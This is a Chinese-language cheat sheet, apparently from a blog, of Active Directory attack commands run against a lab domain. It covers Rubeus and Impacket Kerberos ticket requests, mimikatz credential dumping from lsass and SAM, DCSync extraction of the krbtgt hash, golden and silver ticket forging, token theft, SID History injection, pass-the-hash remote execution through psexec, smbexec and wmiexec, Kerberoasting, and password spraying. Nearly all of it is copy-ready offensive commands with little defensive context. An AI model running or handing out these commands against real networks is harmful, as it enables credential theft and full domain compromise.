![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqoQYsQk2PjSB7icfrpBZyyI3Ob4H3WPFcGmniawzHqM4STe4FEsOOZibAQ/640?wx_fmt=png&from=appmsg)

### 申请 ST

Rubeus 使用 asktgs 模块申请 ST，需要提供一张 TGT，提供的 TGT 可以是 base64 格式的也可以是 kirbi 结尾的票据文件。因此要先使用 Rubeus 请求一张 TGT，然后再使用 asktgs 模块使用该 TGT 请求指定的服务的 ST。可以将请求的 ST 以 base64 格式打印出来，也可以将 ST 保存为文件，也可以将 ST 直接导入内存中。

asktgs 模块有以下参数：

*   • </ticket:Base64 | ticket:FILE.KIRBI> 票据文件
    
*   • </service:SPN1,SPN2> 请求的服务
    
*   • [/enctype:DES|RC4|AEX128|AES256] 加密类型
    
*   • [/dc:DOMAIN_CONTROLLER] 域控
    
*   • [/outfile:FILENAME] 输出的文件
    
*   • [/ptt] 将票据导入到内存中
    
*   • [/nowrap] 打印出的 base64 格式票据的显示格式更友好
    
*   • </tgs:BASE64 | /tgs:FILE.KIRBI> 指定生成 base64 格式的票据还是票据文件
    

1.  1. 请求 TGT
    

首先使用 Rubeus 执行如下命令请求一张 TGT

```
# 明文密码申请TGT，以base64格式打印出来并导入内存中
Rubeus.exe asktgt /user:administrator /password:P@ss1234 /nowrap /ptt

```

1.  1. 请求 ST
    

使用上一步请求的 TGT 即可请求指定服务的 ST 了

*   • 请求 CIFS 的 ST
    

```
# 请求范围跟owa.god.org 的CIFS的ST，并导入内存
Rubeus.exe asktgs /service:"cifs/owa.god.org" /nowrap /ptt/ticket:TGT票据的base64格式

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqicgiaXkicBs3YXTHD56Z0vfVonI5V4rAdAX0t2LzZx7GIlT6xwTftBtHg/640?wx_fmt=png&from=appmsg)

*   • 请求 LDAP 的 ST
    

```
Rubeus.exe asktgs /service:"ldap/owa.god.org" /nowrap /ptt/ticket:TGT票据的base64格式
mimikatz.exe "lsadump::dcsync /domain:god.org /user:krbtgt/csv" "exit"

```

没导入 ST 之前无法导出 krbtgt 用户哈希

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqmEnvnqDc71zobibekA3zX1UykyoshtEb9nbQZscU77p8brgqtz2dJOg/640?wx_fmt=png&from=appmsg)

导入 ST 后就可以了

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqWDNHAWLSGT8X0uoePILmGjBeX0uhgmHiaDjC3yqYOBicmlsPJ3WX2d3A/640?wx_fmt=png&from=appmsg)

Rubeus 导入票据
===========

Rubeus 支持通过票据文件或 base64 格式的票据进行导入。除了 Rubeus 请求生成的 base64 票据还可以是其他工具生成的票据，只要是. kirbi 为后缀的就可以

### 1. 导入 base64 格式的票据

如果请求票据的时候没有使用 / ptt 参数导入内存中，可以直接使用 Rubeus 导入请求的 base64 格式的票据，即可访问目标

请求 TGT 不导入内存中

```
Rubeus.exe asktgt /user:administrator /password:P@ss1234 /nowrap

```

使用以下命令将 base64 格式的票据导入内存中

```
Rubeus.exe ptt /ticket:上一步请求的TGT

```

### 2. 导入票据文件

*   • 导入 Rubeus 生成的票据文件
    

使用 Rubeus 生成的票据文件，并使用 Rubeus 导入票据文件

```
# 明文密码申请TGT，将票据保存为ticket.kirbi文件，不导入内存中
Rubeus.exe asktgt /user:administrator /password:P@ss1234 /nowrap /outfile:ticket.kirbi

# 导入票据
Rubeus.exe ptt /ticket:ticket.kirbi

```

*   • 导入 kekeo 生成的票据文件
    

```
# 明文密码申请TGT，此时会生成一个以kirbi结尾的票据
tgt::ask /user:administrator /domain:god.org /password:P@ss1234

# 导入票据
Rubeus.exe ptt /ticket:TGT_administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi

```

AS-REP Roasting
===============

Kerberoasting
=============

委派攻击
====

mimikatz
========

### 1. standard 模块

与 Kekeo 工具的 Standard 模块功能一样

### 2. 其他模块

*   • crypto 加密模块
    
*   • sekurlsa 用来枚举凭据的命令
    
*   • kerberos 包模块
    
*   • ngc 下一代密码学模块
    
*   • privilege 提权模块
    
*   • process 进程模块
    
*   • service 服务模块
    
*   • lsadump 模块
    
*   • ts 终端服务器模块
    
*   • event 事件模块
    
*   • misc 杂项模块
    
*   • token 令牌操作模块
    
*   • vault Windows 凭据模块
    
*   • minesweeper 模块
    
*   • dpapi 模块
    
*   • busylight 模块
    
*   • sysenv 系统环境值模块
    
*   • sid 安全标识符模块
    
*   • iis IIS XML 配置模块
    
*   • rpc RPC 控制
    
*   • sr98 设备和 T5577 目标模块
    
*   • acr ACR 模块
    

其中常用的是 privilege、sekurlsa、kerberos、lsadump、token、sid 模块

1.  1. privilege 模块
    

该模块是用于提权的模块，很多模块需要高权限运行，所以要先进行提权，只能用具有管理员权限的命令行窗口才可以执行成功，普通用户使用提权命令会失败

```
privilege::debug

```

1.  1. sekurlsa 模块
    

使用该模块需要高权限，因此需要执行提权命令，如下是常用命令

```
# 只抓取内存中保存的用户明文密码
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" exit

# 只抓取内存中保存的用户Hash
mimikatz.exe "privilege::debug" "sekurlsa::msv" exit

# 只抓取内存中保存的用户密码的Key值
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit

# 抓取内存中保存的用户所有凭据
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 加载dmp文件，并导出其中的明文密码
procdump.exe -accepteula -ma lsass.exe lsass.dmp
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords full

# 导出lsass.exe 进程中所有的票据
sekurlsa::tickets /export

```

从 server2012 开始，默认情况下，内存中不保存用户的 明文密码

1.  1. kerberos 模块
    

该模块是与 Kerberos 相关的模块

```
# 查看内存中的kerberos TGT
mimikatz.exe "kerberos::tgt" exit

# 查看内存中所有的Kerberos票据
mimikatz.exe "kerberos::list" exit

# 清除票据
mimikatz.exe "kerberos::purge" exit

# 将票据注入到内存中
mimikatz.exe "kerberos::ptt administrator.kirbi" exit

# 黄金票据传递攻击
kerberos::golden /user:要伪造的域用户 /domain:域名 /sid:域的sid /krbtgt:krbtgt的哈希或AES Key /ptt

# 白银票据传递攻击
kerberos::golden /user:要伪造的域用户 /domain:域名 /sid:域的sid /target:服务机器 /service:指定服务如cifs、ldap /rc4:服务账户的Hash /ptt


```

1.  1. lsadump 模块
    

改模块是对 Local Security Authiruty(LSA) 进行密码抓取的模块

```
# 通过DSync导出指定用户的Hash，格式化输出
lsadump::dcsync /domain:god.org /user:krbtgt /csv

# 通过DSync导出指定用户的密码Hash的详细信息
lsadump::dcsync /domain:god.org /user:krbtgt

# 通过DSync导出所有用户的Hash
lsadump::dcsync /domain:god.org /all /csv

# 读取所有域用户的Hash，需要在域控上以管理员权限打开窗口
privilege::debug
lsadump::lsa /patch

# 从sam.hive和system.hive文件中获得NTLM Hash
reg save hklm\sam sam.hive
reg save hklm\system system.hive
lsadump::sam /sam:sam.hive /system:system.hive

# 从本地SAM文件中读取密码Hash
privilege::debug
token::elevate
lsadump::sam

```

1.  1. token 模块
    

```
# 列出当前进程的token信息
token::whoami
token::whoami /full

# 列出当前系统中存在的token，高权限流出的token最全面
token::list

# 窃取指定token id的token
token::elevate /id

# 窃取System权限的token（默认）
token::elevate /system

# 窃取域管理员的token
token::elevate /domainadmin

# 窃取企业管理员的token
token::elevate /enterpriseadmin

# 窃取本地管理员的token
token::elevate /admin

# 窃取Local Service权限的token
token::elevate /localservice

# 窃取Network service权限的token
token::elevate /networkservice

# 恢复为之前的token
token::revert

```

1.  1. sid 模块
    

```
# 查询指定对象的SID
sid::lookup /name:xuan

# 查询指定SID对应的对象
sid::lookup /sid:S-1-5-21-1982601180-2087634876-2293013296-1001

# 通过samAccountName属性查询对象的一些信息
sid::query /sam:lzx

# 通过SID属性查询对象的一些信息
sid::query /sid:S-1-5-21-2952760202-1353902439-2381784089-1109

# 通过samAccountName属性修改对象的SID
sid::patch
sid::modify /sam:liu /new:S-1-5-21-2952760202-1353902439-2381784089-109

# 通过sid属性修改对象的SID
sid::patch
sid::modify /sid:S-1-5-21-1982601180-2087634876-2293013296-1001 /new:S-1-5-21-2952760202-1353902439-2381784089-109

# 通过samAccountName属性给对象添加一个SID History属性
sid::patch
sid::add /sam:lzx /new:S-1-5-21-2952760202-1353902439-2381784089-109

# 通过sid属性给对象添加一个SID History属性
sid::patch
sid::add /sid:S-1-5-21-1982601180-2087634876-2293013296-1001 /new:S-1-5-21-2952760202-1353902439-2381784089-109

# 将administrator的SID添加到test的SID History属性中
sid::patch
sid::add /sam:lzx /new:administrator

# 清除指定samAccountName对象的SID History属性
sid::clear /sam:xuan

# 清除指定sid对象的SID History属性
sid::clear /sid:S-1-5-21-1982601180-2087634876-2293013296-1001

```

Impacket
========

远程连接
----

*   • 对于域环境：连接域内普通主机，额可以使用普通与用户账户。连接域控需要域管理员账户
    
*   • 对于工作组环境：只能使用 administrator 用户去连接
    

### psexec.py

*   • 连接原理：通过一个管道将二进制文件传到目标机器的 C:\windows 目录下，并在远程主机上创建一个服务。然后通过该服务运行二进制文件，运行完成后删除服务和二进制文件 。该脚本在执行上传的二进制文件时，会被杀毒软件查杀。
    
*   • 连接条件：目标主机开放 445 端口、IPC$ 和非 IPC$ 的任意可写共享
    

1.  1. 工作组环境
    

```
# 使用明文密码
proxychains -q python3 psexec.py administrator:P@ss1234@192.168.52.138

# 使用密码hash
proxychains -q python3 psexec.py administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqxOfXygznWL7AwOXDUFhicN4QVvG9LXVibqIdOV1WwdONU84Rh1f5kKyw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqjVojtUB3EW7vF7U4Ciclnda4dRnic2DrfibMfBcOxpfZSE24c96ia91gYQ/640?wx_fmt=png&from=appmsg)

1.  1. 域环境
    

```
# 使用明文密码
proxychains -q python3 psexec.py god.org/administrator:P@ss1234@192.168.52.138

# 使用密码hash
proxychains -q python3 psexec.py god.org/administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

### smbexec.py

*   • 连接原理：通过文件共享在远程系统中创建服务，，将要运行的命令通过服务写在 bat 文件中来执行，然后将执行结果卸载文件中来获取执行命令的输出，最后将 bat 文件、输出文件和服务都删除。
    
*   • 连接条件：目标主机开启 445 端口、IPC$ 和非 IPC 的任意可写共享，可以使用除 ipc 共享外的其他所有共享 ，默认使用的时 C$，可以使用 - share 参数指定其他共享。
    
*   • 连接过程
    

1.  1. 工作组环境
    

默认情况下该脚本使用的时 UTF-8 编码，国内机器大多数时 GBK 编码 可以使用 -codec 参数指定 GBK 编码

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nq91UTeZZcEdownyPY0ia1hHRSY8TeonLQwKeLueRjOcibeYvgZZYU21Zw/640?wx_fmt=png&from=appmsg)

```
# 使用明文密码
proxychains -q python3 smbexec.py administrator:P@ss1234@192.168.52.138 -codec gbk

# 使用密码hash
proxychains -q python3 smbexec.py administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqLuaJhqf7wcVeZib4JmVcRfMJZibwwNrBdsPRibs1jz0wicMNYBdvCDUItA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nq7iaJpJ7Q4GumJRTGsxARNWw9Qg7DJFAyblMZsHcSerk1loobFYibE3Vg/640?wx_fmt=png&from=appmsg)

1.  1. 域环境
    

```
# 使用明文密码
proxychains -q python3 smbexec.py god.org/administrator:P@ss1234@192.168.52.138

# 使用密码hash
proxychains -q python3 smbexec.py god.org/administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

### wmiexec.py

该脚本主要是 WMI 来实现命令执行，在躲避 AV 查杀方面做的最好

1.  1. 连接条件
    

目标主机开启 445 和 135 端口，并且依赖与 admin$，135 端口来执行命令 445 端口来读取回显

1.  1. 连接过程
    

1）工作组环境

```
# 使用明文密码
proxychains -q python3 wmiexec.py administrator:P@ss1234@192.168.52.138 -codec gbk

# 使用密码hash
proxychains -q python3 wmiexec.py administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqdHkGoDydzsCjHpETmxgYoavegSVOrng5Xlm2AmhpChanvWvX0qVOgA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqflXxLs0ctZKWNZRNOnj2iaoMegT8icRI7ofMm6hfSkaMTMK3dHg6SwhQ/640?wx_fmt=png&from=appmsg)

2）域环境

```
# 使用明文密码
proxychains -q python3 wmiexec.py god.org/liu:123.com@192.168.52.138 -codec gbk

# 使用密码hash
proxychains -q python3 wmiexec.py god.org/administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nq5iaZvZSIGTOiaewiciagZAJiabcEJC9QXJgW9FKwF3sem8ibk4fRT709MpFg/640?wx_fmt=png&from=appmsg)

### atexec.py

该脚本通过任务计划服务来在目标主机上实现命令执行，并返回命令执行后的输出结果

1）工作组环境

```
# 使用明文密码
proxychains -q python3 atexec.py god.org/liu:P@ss1234@192.168.52.143 whoami

# 使用密码Hash
proxychains -q python3 atexec.py administrator@192.168.52.143 whoami -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqGFdHeGIVMswmyNQyichaN3CRpYW0IbXSGrHibBeMwGAQuxBP6qmVyOiaw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nq2eIoUz8SqpONiahYic2ic29icV7yLMJ9poWAFexo7FuRq9nJksibIlUOX4g/640?wx_fmt=png&from=appmsg)

2）域环境

```
# 使用明文密码
proxychains -q python3 atexec.py god.org/liu:123.com@192.168.52.143 whoami

# 使用密码Hash
proxychains -q python3 atexec.py god.org/administrator@192.168.52.143 whoami -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

### dcomexec.py

该脚本通过 DCOM 在目标主机上实现命令，并返回命令执行后的输出结果

```
# 使用明文密码
proxychains -q python3 dcomexec.py liu:123.com@192.168.52.143 whoami

# 使用密码Hash
proxychains -q python3 dcomexec.py administrator@192.168.52.143 whoami -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

### smbclient.py

可以向服务器上传文件

1）工作组

```
# 使用明文密码
proxychains -q python3 smbclient.py administrator:P@ss1234@192.168.52.143
# 使用密码hash
proxychains -q python3 smbclient.py administrator@192.168.52.143 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

# 连接成功之后执行的命令
info # 查看信息
shares # 查看开启的共享
use xx # 指定使用的共享
ls
cd
put xx # 上传文件
get xx # 下载文件

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqAqjoFKraBhsM4q4TAkql6MUhgGVic3H7IZ96Lu9Orr7NSxKHYo3rLUg/640?wx_fmt=png&from=appmsg)

2）域环境

```
# 使用明文密码
proxychains -q python3 smbclient.py god.org/administrator:P@ss1234@192.168.52.143
# 使用密码hash
proxychains -q python3 smbclient.py god.org/administrator@192.168.52.143 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqSucnXEbxxRHfyMU5fm4bpmm15DicdkKp8VdM0oe30ueOLF5vuibFwK6w/640?wx_fmt=png&from=appmsg)

### 获取域内所有用户的 Hash（secretdump.py）

该脚本是利用 DCSync 功能导出域内用户的 Hash，需要连接的账户和密码具有 DCSync 权限

```
# 获取域内所有的用户hash
proxychains -q impacket-secretsdump god.org/administrator:P@ss1234@192.168.52.138 -just-dc

# 使用卷影复制服务导出域内所有hash
proxychains -q impacket-secretsdump god.org/administrator:P@ss1234@192.168.52.138 -use-vss

# 获取域内指定krbtgt用户的hash
proxychains -q impacket-secretsdump god.org/administrator:P@ss1234@192.168.52.138 -just-dc-user krbtgt

# 如果当前导入了管理员的票据，则可以不需要密码直接导出Hash
secretsdump.exe -k -no-pass owa.god.org  -dc-ip 192.168.52.138 -just-dc-user administrator

# 如果是域林，则指定用户需要加域前缀
proxychains -q impacket-secretsdump god.org/administrator:P@ss1234@192.168.52.138 -just-dc-user "god.org\krbtgt"

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqibD6E344zZWSqwoT2QCvCR4O95BZzicRMNz3MMJpWcKB9YPCicTW1qVqQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqn86AYmbErRWfDddhvjRGKHQeXl83SpCN2PPYboB1zhkLfL0QvaPcicg/640?wx_fmt=png&from=appmsg)

### 生成黄金票据

需要目标域的 krbtgt 目标域的 SID

```
# 生成黄金票据
ticketer.exe -domain-sid S-1-5-21-2952760202-1353902439-2381784089 -nthash 58e91a5ac358d86513ab224312314061 -domain god.org administrator

# 导入票据
set KRB5CCNAME=C:\Users\lzx\Desktop\administrator.ccache

# 导出administrator用户的hash
secretsdump.exe -k -no-pass administrator@owa.god.org -dc-ip 192.168.52.138 -just-dc-user administrator

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqYoSmEFMd8OicjvribDCyMicHIyXkJpmdREpicwU3wAtHHnAiay9p14VCmSQ/640?wx_fmt=png&from=appmsg)在导出 hash 的时候有的机器会出现如下错误![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqgrFctSxwnem4DI4XTAic1WMEolHicztFj6sdAkmDPSP6oQ27cT03SEQA/640?wx_fmt=png&from=appmsg)

这是因为编码错误

解决报错可以每次打开命令行都用 chcp 936 来更换当前代码页。

### 请求 TGT(getTGT.py)

需要域用户名、密码 / hash/AESKey 生成具有指定用户权限的. ccache 格式的 TGT。生成的 TGT 和由于下一步请求 ST。

```
# 申请TGT，如果用户密码含有@ 则只接受输入
getTGT.exe god.org/administrator@192.168.52.138 -dc-ip 192.168.52.138 -debug

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqQKNdvgnU4iaQQwu8Czcr1OaaJxA7Q3KqbVnWgZzLkf1Od8VhtfbXrHQ/640?wx_fmt=png&from=appmsg)

### 请求 ST(getST.py)

```
# 提供账户和密码请求指定SPN服务的票据
getST.exe -dc-ip 192.168.52.138 -spn cifs/owa.god.org god.org/administrator:P@ss1234

# 导入票据
set KRB5CCNAME=C:\Users\lzx\Desktop\administrator.ccache

# 访问该服务
smbexec.exe -k -no-pass owa.god.org

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqCZjxsHyhq7Ns3gzo36CIyItSPUu8a9GiawWeZfukrSGdnA4M6BNt9KQ/640?wx_fmt=png&from=appmsg)

使用 TGT 生成的票据请求 ST

```
# 导入上一步请求的TGT票据
set KRB5CCNAME=C:\Users\lzx\Desktop\administrator@192.168.52.138.ccache

# 请求指定SPN的ST
getST.exe -k -no-pass -dc-ip 192.168.52.138 -spn cifs/owa.god.org god.org/administrator@192.168.52.138

# 导入票据
set KRB5CCNAME=C:\Users\lzx\Desktop\administrator@192.168.52.138.ccache

# 访问指定服务
smbexec.exe -k -no-pass owa.god.org

```

### 获取域的 SID（lookupsid.py）

如果获得了域内任意一个用户的账户和密码，则可以利用此脚本执行如下命令获得该域的 SID 值

```
lookupsid.exe god.org/xuan:123.com@192.168.52.138 -domain-sids

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqlKk278cWomojQfUD7CeFiauibAOicJjfusibn1V99wf1IHJ4ibruna3EibYw/640?wx_fmt=png&from=appmsg)

### 枚举域内用户 (samrdump.py)

该脚本通过 SAMR 协议枚举除域内所有用户，使用时需要一个有效的域用户

```
samrdump.exe god.org/liu:123.com@192.168.52.138 -csv

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqkgUeGKJaibcLagHqicVYBa16wHUibwqvktPngOGMAnXC9kzPBzt08d4hA/640?wx_fmt=png&from=appmsg)

### 增加机器账户 (addcomputer.py)

在进行基于资源的约束性委派攻击时，攻击者往往需要一个机器账户进行控制，可以使用该脚本远程连接域控创建一个机器账户，使用时需要一个有效的域用户，有两种方式可以创建，一种是 SAMR 协议，另一种是 LDAPS 协议

使用 SAMR 协议远程创建一个机器账户 machine$，密码为 123.com

```
addcomputer.exe -computer-name 'machine$' -computer-pass '123.com' -dc-ip 192.168.52.138 'god.org/liu:123.com' -method SAMR -debug
addcomputer.exe -computer-name 'machine$' -computer-pass '123.com' -dc-ip 192.168.52.138 'god.org/liu:123.com' -method LDAPS -debug

# 修改密码
addcomputer.exe -computer-name 'machine$' -computer-pass '123.com' -dc-ip 192.168.52.138 'god.org/liu:123.com' -method LDAPS -debug -no-add

```

使用 SAMR 协议创建的机器用户没有 SPN，使用 LDAPS 协议创建的 机器账户具有 SPN

### AS-REP Roasting 攻击 (GetNPUsers.py)

可以自动获取指定 users.txt 文件中的用户是否设置了不需要 Kerberos 预身份验证属性，并获取设置了该属性的账户的 Hash 加密的 Login Session Key

```
GetNPUsers.exe -dc-ip 192.168.52.138 -userfile users.txt -format john god.org/

```

### Kerberoasting 攻击 (GetUserSPNs.py)

GetUserSPNs.py 可以在域外查询指定域的 SPN。需要提供域账户和密码

```
GetUsersSPNs.exe -dc-ip 192.168.52.138 god.org/liu:123.com

# 请求注册于用户下的所有SPN的ST，并以hashcat能破解的格式保存在hash.txt
GetUsersSPNs.exe -request -dc-ip 192.168.52.138 god.org/liu:123.com -outputfile hash.txt

# # 请求注册于指定用户下的SPN的ST，并以hashcat能破解的格式保存在hash.txt
GetUsersSPNs.exe -request -dc-ip 192.168.52.138 god.org/liu:123.com -outputfile hash.txt -request-user administrator

```

### 票据转换 (ticketConverter.py)

将. ccache 和. kirbi 格式的票据进行相互转化

```
python3 ticketConverter.py administrator.ccache administrator.kirbi
python3 ticketConverter.py administrator.kirbi administrator.ccache

```

### 增加、删除和查询 SPN(addspn.py)

该脚本用于增加、删除 SPN。但是增加 SPN 需要域管理员权限，而删除 SPN 只需要对目标属性有修改权限即可

```
# 查询目标SPN，需要一个spn参数，可以是不存在的spn
python3 addspn.py -u 'god.org\liu' -p '123.com' -t 'machine$' -s aa/aa -q 192.168.52.138

# 删除目标指定SPN，需要提供一个spn参数，必须是存在的spn
python3 addspn.py -u 'god.org\liu' -p '123.com' -t 'machine$' -s HOST/machine.god.org -r 192.168.52.138

# 普通域用户五大增加SPN，域管理员才有权限增加SPN
python3 addspn.py -u 'god.org\liu' -p '123.com' -t 'machine$' -s test/test -a 192.168.52.138

# 域管理员增加SPN
python3 addspn.py -u 'god.org\administrator' -p 'P@ss1234' -t 'machine$' -s test/test -a 192.168.52.138

```

Kerbrute
========

```
kerbrute_windows_amd64.exe userenum --dc 192.168.52.138 -d god.org user.txt

```

参数含义

*   • userenum：用户枚举模式
    
*   • -dc：指定域控 ip
    
*   • d：指定域名
    
*   • user.txt：用户名字典文件，用户名可不加域名后缀
    

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqSyHp4MQ4lkIdX8aUbzhibgaIgJu2JDl490TM1njHywg7qPKOYqaKlHQ/640?wx_fmt=png&from=appmsg)

```
kerbrute_windows_amd64.exe passwordspray --dc 192.168.52.138 -d god.org user.txt P@ss1234

kerbrute_windows_amd64.exe bruteuser --dc 192.168.52.138 -d god.org pass.txt administrator


```

参数含义

*   • passwordspray：密码枚举模式
    
*   • -dc：指定域控 ip
    
*   • d：指定域名
    
*   • user.txt：用户名字典文件，用户名可不加域名后缀
    

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqYL3hpH1yPBLxtuGInNRWEI3HKfBjejQfnzt70PqH1lx310jIqvibV4Q/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqXt5ByLpNhnVhuMCn8WDGQYy2dXrWMESMpyPYyZhHIBY0rTTsPduNPA/640?wx_fmt=png&from=appmsg)

pyKerbrute
==========

```
# TCP模式
proxychains -q python2 EnumADUser.py 192.168.52.138 god.org ../kerbrute/user.txt tcp
# UDP模式
proxychains -q python2 EnumADUser.py 192.168.52.138 god.org ../kerbrute/user.txt udp

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqhGFWWS8jLBx8MP5gfyCyTkZ3V3uuJAYakk9K23IfWYMBM7xlicMicyAw/640?wx_fmt=png&from=appmsg)

MSF 模块域内用户名枚举
=============

```
use auxiliary/gather/kerberos_enumusers
set rhosts 192.168.52.138
set domain god.org
set user_file /mnt/d/tools/script/Intranet/recon/kerbrute/user.txt
run

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqBMMJRO5heU0RHw79xmEUbj2NeqSkdHfyZK0Qp6gYLWiaRQlh8zKHw2A/640?wx_fmt=png&from=appmsg)

CrackMapExec
============

```
proxychains -q crackmapexec smb 192.168.52.1/24 -u user.txt -p pass.txt --continue-on-success

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqOcn62bU07UfyV1tAzP8h4NLvuR5ghibyfsS2CnJYpqUE7hO16LaLAOw/640?wx_fmt=png&from=appmsg)

DomainPasswordSpray.ps1
=======================

```
Set-ExecutionPolicy Unrestricted
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 123.com

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqU4pR8mawy4kl3kcI6sCXdkqcq06KvVc4P3m1sLwWgRRxE8jszsDksA/640?wx_fmt=png&from=appmsg)

MSF 模块密码喷洒
==========

```
use auxiliary/scanner/smb/smb_login
set rhost 192.168.52.0/24
set smbdomain god.org
set Pass_FILE script/Intranet/recon/kerbrute/pass.txt
set USER_FILE script/Intranet/recon/kerbrute/user.txt
run

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqoyhI1oPPLrPRkFLOYvIhicBic7icmnAoEg1OXR9BCQcNYDqDq0tH1wWvQ/640?wx_fmt=png&from=appmsg)